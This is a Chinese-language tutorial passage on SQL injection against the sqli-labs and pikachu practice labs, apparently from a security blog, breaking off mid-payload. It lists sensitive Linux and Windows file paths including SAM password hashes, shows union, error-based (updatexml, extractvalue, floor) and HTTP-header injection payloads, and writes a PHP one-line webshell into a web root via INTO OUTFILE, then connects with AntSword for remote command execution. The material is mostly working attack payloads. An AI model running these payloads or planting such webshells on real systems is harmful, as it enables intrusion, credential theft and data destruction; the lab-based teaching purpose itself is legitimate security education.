+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/log/messages</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows-核心敏感文件路径"><a href="#Windows-核心敏感文件路径" class="headerlink" title="Windows 核心敏感文件路径"></a>Windows 核心敏感文件路径</h4><ol>
+<li>系统账号与关键配置</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br><span class="line">C:\Windows\repair\sam            # 系统账号密码哈希</span><br><span class="line">C:\Windows\system32\config\sam</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>数据库与中间件配置</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\MySQL\MySQL Server 5.7\my.ini</span><br><span class="line">D:\phpStudy\MySQL\my.ini</span><br><span class="line">D:\wamp\mysql\my.ini</span><br><span class="line">C:\Windows\System32\inetsrv\config\applicationHost.config   # IIS 配置</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>网站默认绝对路径</li>
+</ol>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\                    # IIS 默认根目录</span><br><span class="line">D:\www\</span><br><span class="line">D:\phpStudy\WWW\</span><br><span class="line">E:\web\</span><br></pre></td></tr></table></figure>
+
+<h4 id="全平台通用网站配置文件（找到了就必看）"><a href="#全平台通用网站配置文件（找到了就必看）" class="headerlink" title="全平台通用网站配置文件（找到了就必看）"></a>全平台通用网站配置文件（找到了就必看）</h4><p>PHP&#x2F;JAVA&#x2F;ASP 站点通用配置，大概率包含：数据库账号、密码、密钥、后台地址。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/config.php</span><br><span class="line">/inc/config.php</span><br><span class="line">/include/config.php</span><br><span class="line">/data/config.php</span><br><span class="line">/application/database.php</span><br><span class="line">/web.config</span><br><span class="line">/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p>常见的路径获取方式还有：报错显示、遗留文件、漏洞报错、平台配置文件等，不过由于各种安全防护的原因，很多文件不能直接读取。</p>
+<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><p><strong>常用函数</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INTO OUTFILE                  # 能写入多行，按格式输出，用的最多</span><br><span class="line">INTO DUMPFILE                 # 只能写入一行且没有输出格式</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>INTO OUTFILE</code> 向 D 盘写入一个名为 <code>1.txt</code> 的文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425024943528.png"></p>
+<p>出现语法错误，因为后台 SQL 语句末尾还有 <code>LIMIT</code> 分页语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="string">&#x27;test123&#x27;</span>, <span class="number">3</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:/1.txt&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>将 URL 调整为注释掉后续 <code>LIMIT</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, &#x27;test123&#x27;, 3 into outfile &#x27;D:/1.txt&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>后台 SQL 语句变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="string">&#x27;test123&#x27;</span>, <span class="number">3</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:/1.txt&#x27;</span> <span class="comment">--+ LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425025927088.png"></p>
+<p>如果没有报错，就说明成功了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425030030865.png"></p>
+<p><code>INTO OUTFILE</code> 后面的路径只能使用单引号，不能使用十六进制或 <code>CHAR()</code> 转换字符。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、判断数据库用户是否高权限用户</span><br><span class="line">2、低权限用户通过操作 information_schema 库查信息</span><br><span class="line">3、高权限用户查询 secure_file_priv，看读写权限情况</span><br><span class="line">4、有读写权限时，读取敏感文件或输出一句话木马文件，获得 webshell</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>写点题外话，给刚开始接触网络安全的朋友增加点兴趣。</p>
+</blockquote>
+<p>一句话木马是最简单的木马，见名知义就是一行代码写成一个木马文件，PHP 写法为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>hack</code> 是木马连接密码，不同语言的一句话木马写法不同，可以自行查阅。</p>
+<p>现在的杀毒软件与防护系统会识别木马文件，上传后可能秒删，需要绕过杀软等防护，后续再讲。</p>
+<p>一句话木马需要连接后才能获得 webshell 权限，因此必须知道上传文件的具体位置，且该位置要能被网站直接访问。</p>
+<p>获取网站路径的方法很多，例如查看 <code>phpinfo()</code> 页面、目录扫描源码、找到遗留配置文件等，后续会讲。</p>
+<p>下面通过 SQL 注入向目标服务器写入 PHP 一句话木马，文件名为 <code>hack.php</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-2/?id=-1 union select 1, &#x27;&lt;?php @eval($_POST[&quot;hack&quot;] );?&gt;&#x27;, 3 into outfile &#x27;D:/version/php/phpstudy_pro/WWW/hack.php&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425035935849.png"></p>
+<p>上传成功后，可以使用 WebShell 管理工具蚁剑 (<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/AntSwordProject/">去下载</a>) 连接：</p>
+<p>在空白处右击，点击“添加数据”。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425040246472.png"></p>
+<p>填写好 URL 地址和连接密码 <code>hack</code> 后点击测试连接，看到绿色提示说明配置正确，点击添加。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425041120664.png"></p>
+<p>双击新添加的数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425041300981.png"></p>
+<p>会看到以下内容：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425041458358.png"></p>
+<p>还能右击选择虚拟终端，获得远程代码执行权限。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425041542567.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260425041842688.png"></p>
+<blockquote>
+<p>这就是 SQL 注入中利用读写权限写入一句话木马获取 webshell 的过程。</p>
+</blockquote>
+<hr>
+<h1 id="SQL之数据类型和提交方式"><a href="#SQL之数据类型和提交方式" class="headerlink" title="SQL之数据类型和提交方式"></a>SQL之数据类型和提交方式</h1><h2 id="SQL-注入的数据类型"><a href="#SQL-注入的数据类型" class="headerlink" title="SQL 注入的数据类型"></a>SQL 注入的数据类型</h2><h3 id="数字型注入点"><a href="#数字型注入点" class="headerlink" title="数字型注入点"></a>数字型注入点</h3><p>很多网页链接有类似结构，例如 sqli-labs 第二关：<code>http://localhost/sqli-labs/Less-2/?id=1</code>，一般被称为数字型注入点。</p>
+<p>其注入点 <code>id</code> 类型为数字，大多数网页中，查看个人信息、查看文章，都会用到这种结构进行信息传递。</p>
+<p>后台 SQL 语句大概为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> id<span class="operator">=</span>$id  <span class="comment">-- $id 为占位，拼接前台 id 字段传递的数据</span></span><br></pre></td></tr></table></figure>
+
+<p>根据之前的实践，我们判断注入点会进行语句拼接，如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL 拼接：</span><br><span class="line">http://localhost/sqli-labs/Less-2/?id=1 and 1=1 --+  -- &#x27;--+&#x27; 为注释，将后续 SQL 语句注释掉，也可以用 &#x27;#&#x27;</span><br><span class="line">http://localhost/sqli-labs/Less-2/?id=1 and 1=2 --+</span><br><span class="line"></span><br><span class="line">后台 SQL 语句：</span><br><span class="line">select * from 表名 where id=1 and 1=1 --+ LIMIT 0,1</span><br><span class="line">select * from 表名 where id=1 and 1=2 --+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>通过不同的页面反馈，判断是否存在注入点。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260423184355253.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260426153439079.png"></p>
+<h3 id="字符型注入点"><a href="#字符型注入点" class="headerlink" title="字符型注入点"></a>字符型注入点</h3><p>很多网页链接有类似结构，<code>http://xxx.com/users.php?name=admin</code>，一般叫做字符型注入点。</p>
+<p>其注入点 <code>name</code> 类型为字符型，后台语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>语句被引号包裹，在 SQL 语句中可以是单引号也可以是双引号，证明接收字符串类型的数据。</p>
+<p>进行语句拼接，也要将引号进行拼接，以 sqli-labs 第一关为例：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL 拼接：</span><br><span class="line">http://localhost/sqli-labs/Less-1/?id=1&#x27; and 1=1 --+</span><br><span class="line">http://localhost/sqli-labs/Less-1/?id=1&#x27; and 1=2 --+</span><br><span class="line"></span><br><span class="line">后台 SQL 语句：</span><br><span class="line">select * from 表名 where id=&#x27;1&#x27; and 1=1 --+ LIMIT 0,1</span><br><span class="line">select * from 表名 where id=&#x27;1&#x27; and 1=2 --+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>通过不同的页面反馈，判断是否存在注入点。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260426155838791.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260426155903134.png"></p>
+<p>我们之前提到过可以随意拼接字符，报错就说明有注入点：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1asdubgasi</span><br></pre></td></tr></table></figure>
+
+<p>但是，对于字符型的注入这个方法不行，MySQL 独特机制，会把输入的 1 后边的无用数据自动过滤。</p>
+<h3 id="模糊查询注入点"><a href="#模糊查询注入点" class="headerlink" title="模糊查询注入点"></a>模糊查询注入点</h3><p>这是一类特殊的注入类型，这类注入主要是进行数据搜索时没过滤搜索参数。</p>
+<p>一般在连接地址有 <code>key=关键字</code>，或者直接通过搜索框进行提交，后台语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段名 <span class="keyword">like</span> <span class="string">&#x27;%关键字%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>注入原理还是一样的，只是需要拼接的符号变多了。</p>
+<p>以 pikachu 靶场为例，安装教程请见：<a href="https://blog.yunkun.top/archives/141bca4c.html">https://blog.yunkun.top/archives/141bca4c.html</a>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260426161752639.png"></p>
+<p>后台语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,id,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%$name%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在搜索框输入拼接语句，点击搜索：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y%&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260426162736841.png"></p>
+<p>后台语句会变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,id,email <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;%y%&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #<span class="operator">%</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>拼接 <code>and 1=1</code> 和 <code>or 1=1</code> 的区别就留给各位自行探索啦。</p>
+</blockquote>
+<h3 id="XX-型注入点"><a href="#XX-型注入点" class="headerlink" title="XX 型注入点"></a>XX 型注入点</h3><p>XX 型指 SQL 语句拼接的方式不同，如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">member</span> <span class="keyword">where</span> username<span class="operator">=</span>(<span class="string">&#x27;$username&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>本质不变，就是进行符号拼接，只是后台程序员加了些乱七八糟的东西，如：<code>&#39;</code>、<code>&quot;</code>、<code>%</code>、<code>)</code>、<code>&#123;</code> 等。</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>无论什么类型的注入点，都是能进行注入攻击的，关键是判断注入点类型。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 拼接半个引号，单引号双引号都试试，只要报错了，就说明引号被传递后台了，存在注入点。</span><br><span class="line"></span><br><span class="line">2. 判断注入点类型，构建 SQL 注入语句：</span><br><span class="line">   - 2.1. `?id=1 and 1=1` 和 `?id=1 and 1=2` 有区别就是数字型，没有就是字符型。</span><br><span class="line">   - 2.2. 字符型就换语句 `?id=1&#x27; and 1=1` 和 `?id=1&quot; and 1=1` 看报错，判断 SQL 语句闭合符号。</span><br><span class="line">   - 2.3. 如果都报错，可能是模糊查询或 XX 型的了，有报错信息就看页面报错回显的 SQL 语句，没有报错回显，后续也会讲到新的办法。</span><br><span class="line"></span><br><span class="line">3. 根据注入点进行数据库信息收集。</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>像是引号、<code>%</code> 这些对于有防护的网站都会被过滤掉，后续也会讲到绕过防护的方法。</p>
+</blockquote>
+<h2 id="SQL-注入的数据提交方式"><a href="#SQL-注入的数据提交方式" class="headerlink" title="SQL 注入的数据提交方式"></a>SQL 注入的数据提交方式</h2><h3 id="GET-提交"><a href="#GET-提交" class="headerlink" title="GET 提交"></a>GET 提交</h3><p>GET 提交为一种很常见的提交方式，主要通过 URL 传输数据给后台，然后带到数据库中执行，注入也是在 URL 上直接注入。</p>
+<p>例如 sqli-labs 前几关都是 GET 提交方式，可以直接在 URL 上修改注入数据，提交到后台。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428002420346.png"></p>
+<h3 id="POST-提交"><a href="#POST-提交" class="headerlink" title="POST 提交"></a>POST 提交</h3><p>POST 提交方式主要适用于表单的提交，用于登录框的注入。</p>
+<p>利用 Burp Suite 抓包修改内容重放进行注入，和 GET 差别是需要抓包工具配合，返回结果主要为代码，也有页面回显的。</p>
+<p>相关 Burp Suite 教程请移步：<a href="https://blog.yunkun.top/archives/f39b7ce2.html">https://blog.yunkun.top/archives/f39b7ce2.html</a>。</p>
+<p>以 Sqli-labs 第 11 关为例，提交一些数据，开启代理，开启拦截。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428013343345.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428013324801.png"></p>
+<p>能看到提交方式为 POST，以表单提交了相关数据，我们可以对数据进行修改，然后放行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428013634842.png"></p>
+<p>拿到了想要的数据库信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428013740778.png"></p>
+<p>因为拿数据是一个大量修改语句的过程，一直使用 Burp Suite 不方便，可以使用浏览器插件 Hackbar。</p>
+<p>Firefox 浏览器的 hackbar 插件经常出现问题，建议使用 Google 浏览器进行实践。</p>
+<p>安装和使用说明请移步：<a href="https://blog.yunkun.top/archives/9508da4a.html">https://blog.yunkun.top/archives/9508da4a.html</a>。</p>
+<p>进入 Hackbar 界面，添加 URL，打开 User POST method，添加 Body，点击 EXECUTE 提交就能看到页面回显了数据库名。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428015459315.png"></p>
+<h3 id="HTTP-Header-注入"><a href="#HTTP-Header-注入" class="headerlink" title="HTTP Header 注入"></a>HTTP Header 注入</h3><p>Header 头并不算是提交方式，只是后台开发人员为验证客户端信息的一个提交表单。</p>
+<p>比较常用的 cookie 验证，或者通过 user-agent、accept 字段等获取一些用户信息。</p>
+<p>客户端会获取 Header 头信息发送后台进行 SQL 处理，如果此时未进行校验，就会引起 HTTP Header 的注入漏洞。</p>
+<p>sqli-labs 第 18 关就是 Header Injection 关卡，打开发现获取了一些客户端信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428175004908.png"></p>
+<p>本关会先校验 cookie 信息，所以先使用 admin&#x2F;admin 登录，也能看到本地信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428182127012.png"></p>
+<p>抓包看一下，重点看是带客户端信息的字段。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428175202827.png"></p>
+<p>将数据发送 Repeater 模块，方便重放，Repeater 模块教程参考：<a href="https://blog.yunkun.top/archives/f39b7ce2.html">https://blog.yunkun.top/archives/f39b7ce2.html</a>。</p>
+<p>不修改 POST 提交的数据信息，修改 User-Agent 头信息，采用报错注入的方式获取数据库信息。</p>
+<p>报错注入相关教程，请参考：<a href="https://blog.yunkun.top/archives/2004793d.html">https://blog.yunkun.top/archives/2004793d.html</a>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260428182658803.png"></p>
+<blockquote>
+<p>这里只是以 UA 头举例，有相同风险的 Header 头还有：Referer、Cookie、XFF(X-Forwarded-For)、Host，还有一些自定义的认证字段。</p>
+</blockquote>
+<hr>
+<h1 id="SQL注入之注入手法"><a href="#SQL注入之注入手法" class="headerlink" title="SQL注入之注入手法"></a>SQL注入之注入手法</h1><h2 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h2><p>在进行 SQL 注入时，有很多注入后页面无反应的情况，也称无回显，这可能是 SQL 查询方式导致的，因此我们要先了解 SQL 的查询方式。</p>
+<h3 id="select-查询"><a href="#select-查询" class="headerlink" title="select 查询"></a>select 查询</h3><p>SQL 中最常见的语句，核心场景为：用户登录、信息查询、列表展示、搜索功能等。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> name<span class="operator">=</span>$name LIMIT <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, username, password <span class="keyword">from</span> users <span class="comment">--+&#x27; LIMIT 1;</span></span><br></pre></td></tr></table></figure>
+
+<p>危害：容易触发报错注入、联合注入、布尔盲注、时间盲注，从而引发账号密码泄露、脱库等。</p>
+<h3 id="update-更新"><a href="#update-更新" class="headerlink" title="update 更新"></a>update 更新</h3><p>核心场景：修改密码、更新个人资料、修改订单状态、管理员后台修改数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> name<span class="operator">=</span><span class="string">&#x27;$name&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>, role<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="comment">--+&#x27; where id=&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>危害：可以通过越权修改任意数据，比如把普通用户改为管理员、篡改密码等。</p>
+<h3 id="insert-插入"><a href="#insert-插入" class="headerlink" title="insert 插入"></a>insert 插入</h3><p>核心场景：用户注册、留言板、评论区、日志记录、文件上传信息入库。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert into</span> users (username, password) <span class="keyword">values</span>(<span class="string">&#x27;$user&#x27;</span>, <span class="string">&#x27;$pass&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert into</span> users (username, password) <span class="keyword">values</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>),(<span class="string">&#x27;hack&#x27;</span>,<span class="string">&#x27;pass&#x27;</span>)<span class="comment">--+&#x27;,&#x27;$pass&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>危害：可以绕过注册，直接插入管理员账号，植入恶意代码，批量插入垃圾数据等。</p>
+<h3 id="delete-删除"><a href="#delete-删除" class="headerlink" title="delete 删除"></a>delete 删除</h3><p>核心场景：删除评论、删除订单、注销账号、管理员删除数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">drop</span> <span class="keyword">table</span> test<span class="comment">--+&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>危害：删表、删库、清空数据、删除核心用户表，使网站彻底瘫痪等。</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>针对获取的数据不能回显到前端页面，我们可以利用一些方法使页面强制报错回显，称为报错注入。</p>
+<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p><code>updatexml()</code> 从目标 XML 中更改包含所查询的字符串，该函数有三个参数：</p>
+<ul>
+<li><code>updatexml(XML_document, XPath_string, new_value)</code><ul>
+<li><ol>
+<li><code>XML_document</code> 是 String 类型，为 XML 文档对象名称。</li>
+</ol>
+</li>
+<li><ol start="2">
+<li><code>XPath_string</code>（Xpath 格式字符串）。</li>
+</ol>
+</li>
+<li><ol start="3">
+<li><code>new_value</code>，String 类型，替换查找到的符合条件的数据。</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<p>当 <code>XPath_string</code> 参数出现错误时就会报错，以 sqli-labs 第 11 关为例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1, concat(0x7e, (select database()), 0x7e), 3) #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260430173139927.png"></p>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><p><code>extractvalue()</code> 从目标中返回查询的字符串，该函数有两个参数：</p>
+<ul>
+<li><code>extractvalue(XML_document, XPath_String)</code><ul>
+<li><ol>
+<li><code>XML_document</code> 是 String 类型，为 XML 文档对象名称。</li>
+</ol>
+</li>
+<li><ol start="2">
+<li><code>XPath_string</code>（Xpath 格式字符串）。</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<p>和 <code>updatexml()</code> 用法一致，当 <code>XPath_string</code> 参数出现错误时就会报错，以 sqli-labs 第 11 关为例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or extractvalue(1, concat(0x7e, (version), 0x7e)) or&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or extractvalue(1, concat(0x7e, (version()), 0x7e)) #</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260430174055910.png"></p>
+<h3 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h3><p><code>floor()</code> 报错的原理是 <code>group by</code> 在向临时表中插入数据时，由于 <code>rand()</code> 多次计算导致插入临时表时主键重复，从而报错，报错前的 SQL 语句或函数会被先执行，从而使语句报错时抛出的主键是 SQL 语句执行后的结果。</p>
+<p>一句话来说就是 <code>floor(rand(0)*2)</code> 在配合 <code>group by</code> 分组统计时，会产生主键重复冲突，触发 MySQL 报错，同时报错信息中会带出拼接的结果。</p>
+<p>不理解也没关系，<code>floor</code> 的报错语句，严格来说是固定的，不可修改，且在 MySQL 8.0 以上版本已经完全失效。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 爆数据库版本</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 爆出当前数据库</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span 